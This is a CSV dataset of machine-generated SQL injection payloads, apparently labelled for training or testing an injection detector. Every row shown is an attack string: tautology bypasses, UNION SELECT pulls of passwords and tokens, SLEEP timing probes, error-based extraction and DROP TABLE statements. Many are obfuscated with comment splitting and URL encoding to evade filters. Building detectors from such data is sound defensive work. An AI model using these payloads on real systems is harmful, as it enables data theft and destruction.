text,label,attack_type,generator
"'] UnIoN SeLeCt uSeR,LaSt_nAmE FrOm uSeRs#",1,sqli,codellama
`%0d%0aA/**/N/**/D%0d%0a1/**/BETWEEN/**/0/**/A/**/N/**/D/**/9%0d%0a/*x*/,1,sqli,codellama
'/**/A/**/N/**/D/**/2>1/**/--/**/-,1,sqli,codellama
%2522%2529%252509OR%252509%2527a%2527%253D%2527a%2527%252509--,1,sqli,codellama
`;%09D/**/R/**/O/**/P%09TABLE%09tokens/*x*/,1,sqli,codellama
%2527%255D%2520Or%25201%253D1%2520lImIt%25201%2523,1,sqli,codellama
'; D/**/R/**/O/**/P TABLE admin--,1,sqli,codellama
%2560%2520U/**/N/**/I/**/O/**/N%2520S/**/E/**/L/**/E/**/C/**/T%2520username%252Cpwd%252Cstatus%252Caccount%252Clast_name%252Cid%2520F/**/R/**/O/**/M%2520admin--,1,sqli,codellama
""" aNd ''='' #",1,sqli,codellama
""");%09SELECT%09SLEEP(5)%23",1,sqli,codellama
"`+UNION+SELECT+username,pwd,account,status+FROM+accounts#",1,sqli,codellama
""")%0aOr%0A2>1%0A#",1,sqli,codellama
%2527%252F%252A%252A%252FOR%252F%252A%252A%252F%2527a%2527%253D%2527a%2527%252F%252A%252A%252F--%2520,1,sqli,codellama
'	oR	''=''	--,1,sqli,codellama
%2527%25250aOR%25250a1%2520LIKE%25201%25250a--%2520-,1,sqli,codellama
']%0aAND%0a(SELECT%0aCOUNT(*)%0aFROM%0acredentials)>0%23,1,sqli,codellama
"""%0aA/**/N/**/D%0a'a'='a'%0a#",1,sqli,codellama
"""	A/**/N/**/D	'a'='a'	--%09",1,sqli,codellama
%2527%255D%25250aOr%25250A1%253D2%25250A--%2520-,1,sqli,codellama
""")%0aO/**/R%0a'a'='a'%0a-- ",1,sqli,codellama
%2527%255D%25250d%25250aOR%25250d%25250a1%253D1%25250d%25250a--%2520,1,sqli,codellama
""") A/**/n/**/D 1=2 #",1,sqli,codellama
"' A/**/N/**/D extractvalue(1,concat(0x7e,(S/**/E/**/L/**/E/**/C/**/T account F/**/R/**/O/**/M admin LIMIT 1)))",1,sqli,codellama
`%09oR%091 LiKe 1%09--,1,sqli,codellama
%2560%253B%25250aSELECT%25250aSLEEP%25285%2529--,1,sqli,codellama
%2522%25250d%25250aAND%25250d%25250a1%2520LIKE%25201%25250d%25250a%252523,1,sqli,codellama
%2527%252F%252A%252A%252FO%252F%252A%252A%252FR%252F%252A%252A%252F1%2520LIKE%25201%252F%252A%252A%252F--%2520,1,sqli,codellama
%2527%252F%252A%252A%252FOR%252F%252A%252A%252F%2527%2527%253D%2527%2527%252F%252A%252A%252F--,1,sqli,codellama
']/**/aNd/**/2>1/**//*x*/,1,sqli,codellama
"""	OR	2>1	--/**/",1,sqli,codellama
"""%09O/**/R%092>1%09--",1,sqli,codellama
""") UnIoN SeLeCt uId,rOlE FrOm sEsSiOnS-- -",1,sqli,codellama
'/**/AnD/**/1=2/**/--,1,sqli,codellama
""")%0aO/**/R%0a1=1%0aLIMIT%0a1/*x*/",1,sqli,codellama
%2522%25250d%25250aA%252F%252A%252A%252FN%252F%252A%252A%252FD%25250d%25250a1%2520BETWEEN%25200%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%25209%25250d%25250a%252523,1,sqli,codellama
') Or 1=1 lImIt 1--,1,sqli,codellama
`%0aA/**/N/**/D%0a1+BETWEEN+0+A/**/N/**/D+9%0a--+,1,sqli,codellama
""")/**/A/**/N/**/D/**/1 LIKE 1/**/--",1,sqli,codellama
""") O/**/R ''='' -- ",1,sqli,codellama
')%0aO/**/R%0a1%09LIKE%091%0a#,1,sqli,codellama
')	A/**/n/**/D	1 LiKe 1	#,1,sqli,codellama
"""/**/A/**/N/**/D/**/2>1/**/%23",1,sqli,codellama
%2522%2529%2520U/**/N/**/I/**/O/**/N%2520S/**/E/**/L/**/E/**/C/**/T%2520email%2520F/**/R/**/O/**/M%2520accounts%252523,1,sqli,codellama
""")/**/O/**/R/**/1%0aLIKE%0a1/**/--",1,sqli,codellama
`+oR+0<1+--+,1,sqli,codellama
"""/**/AnD/**/1=1/**/--",1,sqli,codellama
%2527%2529%25250d%25250aOR%25250d%25250a1%2520BETWEEN%25200%2520AND%25209%25250d%25250a--%2520,1,sqli,codellama
""") A/**/N/**/D 1 LIKE 1 -- ",1,sqli,codellama
']+Or+0<1+/*x*/,1,sqli,codellama
' O/**/R 1=2 /*x*/,1,sqli,codellama
""")%09O/**/R%091%0aBETWEEN%0a0%0aA/**/N/**/D%0a9%09--",1,sqli,codellama
%2527%2529%25250aAnD%25250a1%2520BeTwEeN%25200%2520AnD%25209%25250a--,1,sqli,codellama
%2560%2509OR%25091%253D2%2509--,1,sqli,codellama
'%09aNd%092>1%09%23,1,sqli,codellama
%2527%255D%252F%252A%252A%252FOR%252F%252A%252A%252F1%2520LIKE%25201%252F%252A%252A%252F--%2520,1,sqli,codellama
')%09AnD%09(sElEcT%09CoUnT(*)%09fRoM%09CrEdEnTiAlS)>0--,1,sqli,codellama
%2527%255D%2509O/**/R%2509%2527%2527%253D%2527%2527%2509%252F%252Ax%252A%252F,1,sqli,codellama
'%09AND%091=1%09--,1,sqli,codellama
%2527%2529%252BO/**/R%252B2%253E1%252B%2523,1,sqli,codellama
'%0D%0aOr%0D%0a''=''%0d%0A#,1,sqli,codellama
""")%0aAnD%0a''=''%0a%23",1,sqli,codellama
`/**/Or/**/''=''/**/-- ,1,sqli,codellama
%2560%2520oR%25201%253D1%2520LiMiT%25201%252F%252Ax%252A%252F,1,sqli,codellama
'%0d%0aA/**/N/**/D%0d%0a1=1%0d%0a--/**/,1,sqli,codellama
%2522%2520O/**/R%25201%253D1%2520LIMIT%25201--,1,sqli,codellama
' a/**/N/**/d 1 bEtWeEn 0 a/**/N/**/d 9 #,1,sqli,codellama
%2522%25250D%25250aOr%25250D%25250a%2527%2527%253D%2527%2527%25250d%25250A--,1,sqli,codellama
`%09A/**/N/**/D%091/**/LIKE/**/1%09/*x*/,1,sqli,codellama
""" a/**/N/**/d 1 bEtWeEn 0 a/**/N/**/d 9 /*x*/",1,sqli,codellama
']%0aAND%0a1=2%0a--,1,sqli,codellama
""") U/**/N/**/I/**/O/**/N S/**/E/**/L/**/E/**/C/**/T NULL,NULL,NULL,NULL-- -",1,sqli,codellama
""" O/**/R 'a'='a' -- -",1,sqli,codellama
%2560%25250d%25250aOR%25250d%25250a0%253C1%25250d%25250a%252F%252Ax%252A%252F,1,sqli,codellama
%2527%255D%253B%2520SELECT%2520SLEEP%25285%2529--%2520,1,sqli,codellama
')	O/**/R	1=1	#,1,sqli,codellama
'%0aO/**/R%0a1=1%0aLIMIT%0a1%23,1,sqli,codellama
""")/**/OR/**/2>1/**/--%0a",1,sqli,codellama
""" aNd 0<1 #",1,sqli,codellama
%2522%2520OR%25201%253D1%2520LIMIT%25201--%2520,1,sqli,codellama
%2522%2529%2520OR%25201%253D1%2520LIMIT%25201--%2520-,1,sqli,codellama
') Or 1=1 -- -,1,sqli,codellama
'; S/**/e/**/L/**/e/**/C/**/t s/**/L/**/e/**/E/**/p(5)/*x*/,1,sqli,codellama
']%0d%0AoR%0d%0A1=2%0D%0a--%09-,1,sqli,codellama
%2527%2529%25250d%25250aAND%25250d%25250a1%253D2%25250d%25250a--%2520,1,sqli,codellama
""")+O/**/r+1 lIkE 1+%23",1,sqli,codellama
"""+aNd+(SeLeCt+cOuNt(*)+FrOm+sEsSiOnS)>0#",1,sqli,codellama
'%0AaNd%0A1=2%0A%23,1,sqli,codellama
%2527%2529%2509Or%2509%2527A%2527%253D%2527A%2527%2509--%2520-,1,sqli,codellama
')+O/**/r+0<1+-- -,1,sqli,codellama
%2560%25250d%25250aA/**/N/**/D%25250d%25250a1%253D2%25250d%25250a%2523,1,sqli,codellama
')%0aOr%0A1=1%0A#,1,sqli,codellama
""") UnIoN SeLeCt aCcOuNt,uId,iD FrOm aDmIn-- ",1,sqli,codellama
'/**/O/**/R/**/'a'='a'/**/--,1,sqli,codellama
')	OR	1+LIKE+1	--+-,1,sqli,codellama
"""+AND+(SELECT+COUNT(*)+FROM+staff)>0/*x*/",1,sqli,codellama
%2560%252509oR%2525092%253E1%252509%252523,1,sqli,codellama
']+A/**/N/**/D+1 LIKE 1+#,1,sqli,codellama
""" U/**/N/**/I/**/O/**/N S/**/E/**/L/**/E/**/C/**/T NULL,NULL,NULL,NULL,NULL/*x*/",1,sqli,codellama
""") A/**/n/**/D 1=1 #",1,sqli,codellama
%2527%252509AND%252509%2527%2527%253D%2527%2527%252509%252F%252Ax%252A%252F,1,sqli,codellama
%2527%255D%252509Or%252509%2527A%2527%253D%2527A%2527%252509--,1,sqli,codellama
"""+oR+1 BeTwEeN 0 AnD 9+/*X*/",1,sqli,codellama
"""%0aO/**/R%0a'a'='a'%0a%23",1,sqli,codellama
%2527%2529%2520A/**/N/**/D%25201%253D1%2520--%2520-,1,sqli,codellama
']%09AND%092>1%09/*x*/,1,sqli,codellama
%2522%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520customers%2529%253E0%252523,1,sqli,codellama
'/**/A/**/n/**/D/**/1 lIkE 1/**/#,1,sqli,codellama
%2522%2529%2520OR%2520%2527%2527%253D%2527%2527%2520%252523,1,sqli,codellama
%2522%253B%2520DROP%2520TABLE%2520admin--%2520,1,sqli,codellama
')%09A/**/n/**/D%092>1%09#,1,sqli,codellama
"']%0aAnD%0aExTrAcTvAlUe(1,cOnCaT(0x7e,(SeLeCt%0AsTaTuS%0aFrOm%0AcReDeNtIaLs%0AlImIt%0A1)))",1,sqli,codellama
"'] U/**/n/**/I/**/o/**/N S/**/e/**/L/**/e/**/C/**/t iD,StAtUs,lAsT_NaMe,uSeR,NaMe f/**/R/**/o/**/M UsErS--",1,sqli,codellama
%2527%2529%252509OR%2525091%253D2%252509%2523,1,sqli,codellama
%2560%252509OR%2525091%253D2%252509--,1,sqli,codellama
%2522%252F%252A%252A%252FAND%252F%252A%252A%252F%2527a%2527%253D%2527a%2527%252F%252A%252A%252F--%2520,1,sqli,codellama
%2522%2529%252BAND%252B%2527%2527%253D%2527%2527%252B--%2520,1,sqli,codellama
%2522%252F%252A%252A%252FOR%252F%252A%252A%252F1%253D2%252F%252A%252A%252F--%2520,1,sqli,codellama
%2522%25250aAND%25250a1%2520LIKE%25201%25250a%252523,1,sqli,codellama
'%0aO/**/R%0a'a'='a'%0a#,1,sqli,codellama
%2527%2529%252509Or%252509%2527A%2527%253D%2527A%2527%252509%252523,1,sqli,codellama
%2522%2529%2520OR%25201%253D1%2520LIMIT%25201%252523,1,sqli,codellama
""");+DROP+TABLE+tokens%23",1,sqli,codellama
%2527%253B%2520SeLeCt%2520sLeEp%25285%2529--,1,sqli,codellama
%2560%2509A/**/N/**/D%25091%253D2%2509--%2520,1,sqli,codellama
%2522%2529%2509OR%2509%2527a%2527%253D%2527a%2527%2509%252F%252Ax%252A%252F,1,sqli,codellama
"""%0d%0aA/**/N/**/D%0d%0a1 BETWEEN 0 A/**/N/**/D 9%0d%0a-- -",1,sqli,codellama
`	oR	2>1	#,1,sqli,codellama
` a/**/N/**/d (S/**/e/**/L/**/e/**/C/**/t cOuNt(*) F/**/r/**/O/**/m uSeRs)>0-- -,1,sqli,codellama
%2527%255D%252BOR%252B0%253C1%252B--%25250a-,1,sqli,codellama
%2527%255D%2520AND%25200%253C1%2520%252F%252Ax%252A%252F,1,sqli,codellama
' a/**/N/**/d (S/**/e/**/L/**/e/**/C/**/t cOuNt(*) F/**/r/**/O/**/m tOkEnS)>0-- -,1,sqli,codellama
%2527%255D%2520Or%2520%2528SeLeCt%2520uSeRnAmE%2520FrOm%2520oRdErS%2520WhErE%2520UsErNaMe%253D907%2529%253d818,1,sqli,codellama
%2560%252BoR%252B1%253D1%252B--,1,sqli,codellama
"']+UnIoN+SeLeCt+tOkEn,uId,iD+FrOm+mEmBeRs--+",1,sqli,codellama
""")/**/A/**/N/**/D/**/1/**/BETWEEN/**/0/**/A/**/N/**/D/**/9/**/--/**/-",1,sqli,codellama
'] AnD 1 BeTwEeN 0 AnD 9 /*X*/,1,sqli,codellama
` A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M admin)>0#,1,sqli,codellama
""")+AND+extractvalue(1,concat(0x7e,(SELECT+username+FROM+tokens+LIMIT+1)))",1,sqli,codellama
')+Or+0<1+#,1,sqli,codellama
%2560%253B%2520DROP%2520TABLE%2520admin--,1,sqli,codellama
""")	O/**/R	''=''	%23",1,sqli,codellama
%2527%252BOR%252B1%253D1%252BLIMIT%252B1%2523,1,sqli,codellama
%2522%2529%25250d%25250AaNd%25250D%25250a2%253E1%25250d%25250A--,1,sqli,codellama
""")+O/**/r+2>1+-- ",1,sqli,codellama
%2527%2529%252509A%252F%252A%252A%252FN%252F%252A%252A%252FD%2525091%2520BETWEEN%25200%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%25209%252509--%2520-,1,sqli,codellama
""")%09Or%09'A'='A'%09#",1,sqli,codellama
%2527%255D%252BOR%252B1%252BBETWEEN%252B0%252BAND%252B9%252B--,1,sqli,codellama
"')+UNION+SELECT+status,email,username+FROM+accounts--+",1,sqli,codellama
')	O/**/R	''=''	--,1,sqli,codellama
')/**/oR/**/0<1/**/--,1,sqli,codellama
"""); d/**/R/**/o/**/P TaBlE MeMbErS%23",1,sqli,codellama
'; DrOp tAbLe tOkEnS%23,1,sqli,codellama
""")+AnD+'a'='a'+/*X*/",1,sqli,codellama
%2560%252F%252A%252A%252FO/**/R%252F%252A%252A%252F1%253D2%252F%252A%252A%252F--,1,sqli,codellama
"""; D/**/r/**/O/**/p tAbLe mEmBeRs%23",1,sqli,codellama
%2527%255D%252BA%252F%252A%252A%252FN%252F%252A%252A%252FD%252B%2527a%2527%253D%2527a%2527%252B%2523,1,sqli,codellama
%2522%2529%2520OR%2520%2527a%2527%253D%2527a%2527%2520--,1,sqli,codellama
""")%0d%0AoR%0d%0A1%0alIkE%0a1%0d%0A--%0a",1,sqli,codellama
')%0aOR%0a1=2%0a--+-,1,sqli,codellama
%2527%2529%2520UNION%2520SELECT%2520user%2520FROM%2520members%252523,1,sqli,codellama
"'] UnIoN SeLeCt nUlL,NuLl,nUlL,NuLl,nUlL,NuLl-- -",1,sqli,codellama
""" a/**/N/**/d (S/**/e/**/L/**/e/**/C/**/t cOuNt(*) F/**/r/**/O/**/m mEmBeRs)>0--",1,sqli,codellama
')+Or+1=1+#,1,sqli,codellama
%2527%2529%25250d%25250aO/**/R%25250d%25250a%2527%2527%253D%2527%2527%25250d%25250a--%2520,1,sqli,codellama
`;%09DROP%09TABLE%09users#,1,sqli,codellama
"') U/**/n/**/I/**/o/**/N S/**/e/**/L/**/e/**/C/**/t fIrSt_nAmE,AcCoUnT,Id,pAsSwO/**/rD F/**/r/**/O/**/m aDmIn%23",1,sqli,codellama
')%09Or%090<1%09%23,1,sqli,codellama
%2522%252BOR%252B1%253D1%252BLIMIT%252B1--%252B-,1,sqli,codellama
%2522%2529%252F%252A%252A%252FaNd%252F%252A%252A%252F1%253D1%252F%252A%252A%252F%252523,1,sqli,codellama
%2527%2529%253B%2520S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520S%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FE%252F%252A%252A%252FP%25285%2529%252F%252Ax%252A%252F,1,sqli,codellama
')	O/**/R	2>1	/*x*/,1,sqli,codellama
` A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M accounts)>0/*x*/,1,sqli,codellama
%2522%2529%25250d%25250AaNd%25250D%25250a1%2520BeTwEeN%25200%2520AnD%25209%25250d%25250A%252f%252Ax%252A%252f,1,sqli,codellama
%2522%2529%253B%252BSELECT%252BSLEEP%25285%2529%252F%252Ax%252A%252F,1,sqli,codellama
')%0aO/**/R%0a2>1%0a--,1,sqli,codellama
%2522%2529%2520OR%25202%253E1%2520--%2520-,1,sqli,codellama
')%0aOr%0A'A'='A'%0A-- ,1,sqli,codellama
']%0aO/**/R%0a1=1%0aLIMIT%0a1--%0a-,1,sqli,codellama
%2522%2529%2520U%252F%252A%252A%252FN%252F%252A%252A%252FI%252F%252A%252A%252FO%252F%252A%252A%252FN%2520S%252F%252A%252A%252FE%252F%252A%252A%252FL%252F%252A%252A%252FE%252F%252A%252A%252FC%252F%252A%252A%252FT%2520id%252Crole%252Cpwd%2520F%252F%252A%252A%252FR%252F%252A%252A%252FO%252F%252A%252A%252FM%2520accounts--%2520-,1,sqli,codellama
') Or 1 lIkE 1 /*X*/,1,sqli,codellama
' oR ''='' #,1,sqli,codellama
%2527%255D%2520Or%25201%253D1%2520lImIt%25201%252F%252aX%252a%252F,1,sqli,codellama
%2522%2529%2509O/**/R%25091%2520BETWEEN%25200%2520A/**/N/**/D%25209%2509--,1,sqli,codellama
%2527%2529%2520UNION%2520SELECT%2520user%2520FROM%2520members%252F%252Ax%252A%252F,1,sqli,codellama
'] O/**/R 'a'='a' %23,1,sqli,codellama
`%09A/**/N/**/D%092>1%09-- ,1,sqli,codellama
`; SeLeCt sLeEp(5)-- -,1,sqli,codellama
%2522%2520O%252F%252A%252A%252FR%25201%2520BETWEEN%25200%2520A%252F%252A%252A%252FN%252F%252A%252A%252FD%25209%2520%2523,1,sqli,codellama
%2527%255D%252F%252A%252A%252FoR%252F%252A%252A%252F2%253E1%252F%252A%252A%252F--%2520,1,sqli,codellama
"']+UNION+SELECT+NULL,NULL,NULL,NULL,NULL,NULL--+",1,sqli,codellama
`/**/AnD/**/0<1/**//*X*/,1,sqli,codellama
'];%0AdRoP%0aTaBlE%0aAcCoUnTs/*X*/,1,sqli,codellama
""")+O/**/r+''=''+/*x*/",1,sqli,codellama
"""/**/UNION/**/SELECT/**/first_name/**/FROM/**/sessions/*x*/",1,sqli,codellama
"""+oR+1%09LiKe%091+--%09",1,sqli,codellama
'%0aA/**/N/**/D%0a'a'='a'%0a--%0a,1,sqli,codellama
']/**/aNd/**/1 BeTwEeN 0 AnD 9/**/%23,1,sqli,codellama
']%09Or%09''=''%09--/**/,1,sqli,codellama
%2527%2529%25250aAnD%25250a%2527%2527%253D%2527%2527%25250a--%2520,1,sqli,codellama
"""/**/O/**/R/**/2>1/**/--/**/",1,sqli,codellama
%2527%255D%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520admin%2529%253E0--,1,sqli,codellama
%2522%2529%2509Or%25091%2520lIkE%25201%2509%2523,1,sqli,codellama
%2527%255D%2520A/**/N/**/D%25201%253D2%2520--%2520-,1,sqli,codellama
%2522%25250d%25250aAND%25250d%25250a1%2520BETWEEN%25200%2520AND%25209%25250d%25250a%252F%252Ax%252A%252F,1,sqli,codellama
""")%09AnD%092>1%09-- ",1,sqli,codellama
""")	OR	'a'='a'	--%09-",1,sqli,codellama
%2527%255D%2509AND%25091%2520LIKE%25201%2509%252F%252Ax%252A%252F,1,sqli,codellama
%2527%252F%252A%252A%252FOr%252F%252A%252A%252F1%2520LiKe%25201%252F%252A%252A%252F%2523,1,sqli,codellama
%2560%2509AND%25091%253D1%2509--%2520-,1,sqli,codellama
%2527%252BOR%252B%2527%2527%253D%2527%2527%252B%252523,1,sqli,codellama
'	oR	'a'='a'	%23,1,sqli,codellama
`%09O/**/R%091=1%09LIMIT%091%23,1,sqli,codellama
'] A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M members)>0#,1,sqli,codellama
""") AnD 1=2 /*X*/",1,sqli,codellama
')%0d%0AaNd%0D%0a1 BeTwEeN 0 AnD 9%0d%0A#,1,sqli,codellama
"""+aNd+''=''+#",1,sqli,codellama
"""/**/O/**/R/**/1=1/**/-- ",1,sqli,codellama
""")%0d%0aOR%0d%0a1=2%0d%0a--%0a-",1,sqli,codellama
%2522%25250d%25250aO/**/R%25250d%25250a%2527%2527%253D%2527%2527%25250d%25250a--%2520,1,sqli,codellama
`%09oR%092>1%09-- -,1,sqli,codellama
"')/**/U/**/N/**/I/**/O/**/N/**/S/**/E/**/L/**/E/**/C/**/T/**/last_name,first_name,id,uid,passwo/**/rd/**/F/**/R/**/O/**/M/**/credentials/*x*/",1,sqli,codellama
%2527%2529%25250aAND%25250a2%253E1%25250a%252F%252Ax%252A%252F,1,sqli,codellama
%2522%2529%2520AND%2520%2528SELECT%2520COUNT%2528%252A%2529%2520FROM%2520members%2529%253E0%252523,1,sqli,codellama
%2522%2529%252509OR%2525091%2520LIKE%25201%252509--,1,sqli,codellama
`+OR+1%09LIKE%091+#,1,sqli,codellama
'%09A/**/N/**/D%09''=''%09--%09-,1,sqli,codellama
']	Or	2>1	--,1,sqli,codellama
']/**/aNd/**/1%0aBeTwEeN%0a0%0aAnD%0a9/**//*x*/,1,sqli,codellama
']	O/**/R	1=2	/*x*/,1,sqli,codellama
'+aNd+1=1+/*x*/,1,sqli,codellama
'%09AND%091%0aBETWEEN%0a0%0aAND%0a9%09--%0a,1,sqli,codellama
""" oR 1=1 LiMiT 1%23",1,sqli,codellama
'];+S/**/E/**/L/**/E/**/C/**/T+S/**/L/**/E/**/E/**/P(5)#,1,sqli,codellama
"""/**/AND/**/0<1/**/--%0a-",1,sqli,codellama
')+A/**/n/**/D+1 LiKe 1+%23,1,sqli,codellama
' oR 1=1 /*X*/,1,sqli,codellama
'/**/OR/**/1%0aBETWEEN%0a0%0aAND%0a9/**/#,1,sqli,codellama
`/**/OR/**/1=1/**/LIMIT/**/1#,1,sqli,codellama
%2522%2520OR%25201%253D1%2520LIMIT%25201%252F%252Ax%252A%252F,1,sqli,codellama
` aNd 0<1 /*x*/,1,sqli,codellama
`%0D%0aA/**/n/**/D%0d%0A1 bEtWeEn 0 a/**/N/**/d 9%0D%0a%23,1,sqli,codellama
"'%0aUNION%0aSELECT%0afirst_name,email,status,password,id,role%0aFROM%0amembers/*x*/",1,sqli,codellama
%2522%2529%253B%2520dRoP%2520TaBlE%2520AdMiN%252F%252Ax%252A%252F,1,sqli,codellama
""")	A/**/N/**/D	''=''	/*x*/",1,sqli,codellama
""" A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M credentials)>0/*x*/",1,sqli,codellama
"""; D/**/R/**/O/**/P TABLE admin-- -",1,sqli,codellama
'%0AaNd%0A2>1%0A-- -,1,sqli,codellama
'] A/**/N/**/D (S/**/E/**/L/**/E/**/C/**/T COUNT(*) F/**/R/**/O/**/M accounts)>0#,1,sqli,codellama
%2527%255D%252BAND%252B%2527%2527%253D%2527%2527%252B--%2520,1,sqli,codellama
""")%09O/**/R%092>1%09--",1,sqli,codellama
%2522%25250d%25250aOR%25250d%25250a0%253C1%25250d%25250a%2523,1,sqli,codellama
%2522%2529%2509AnD%2509%2527%2527%253D%2527%2527%2509--%2520,1,sqli,codellama
""")%0d%0Ao/**/R%0d%0A1 lIkE 1%0d%0A%23",1,sqli,codellama
%2527%2529%2509OR%25091%253D2%2509%2523,1,sqli,codellama
%2522%2509AND%25092%253E1%2509--,1,sqli,codellama
%2522%2529%2520OR%25201%2520LIKE%25201%2520--%2520-,1,sqli,codellama
')%0d%0Ao/**/R%0d%0A1=2%0D%0a#,1,sqli,codellama
%2527%2529%2509OR%2509%2527a%2527%253D%2527a%2527%2509%252F%252Ax%252A%252F,1,sqli,codellama
%2522%2529%252BAND%252B1%253D2%252B%252523,1,sqli,codellama
' A/**/N/**/D 2>1 %23,1,sqli,codellama
%2527%253B%2520SELECT%2520SLEEP%25285%2529%2523,1,sqli,codellama
%2527%2520oR%25201%253d1%2520LiMiT%25201%252f%252Ax%252A%252f,1,sqli,codellama
"""/**/Or/**/1=1/**//*x*/",1,sqli,codellama
"""	O/**/R	''=''	--",1,sqli,codellama
""")%0aU/**/N/**/I/**/O/**/N%0aS/**/E/**/L/**/E/**/C/**/T%0aNULL--",1,sqli,codellama
%2527%2529%2520UnIoN%2520SeLeCt%2520rOlE%252CToKeN%252CUsEr%252ClAsT_NaMe%252CnAmE%252CUsErNaMe%2520fRoM%2520SeSsIoNs%2523,1,sqli,codellama
%2560%2520aNd%25201%253D2%2520%252F%252Ax%252A%252F,1,sqli,codellama
%2522%2529%252509AND%252509%2527a%2527%253D%2527a%2527%252509--,1,sqli,codellama
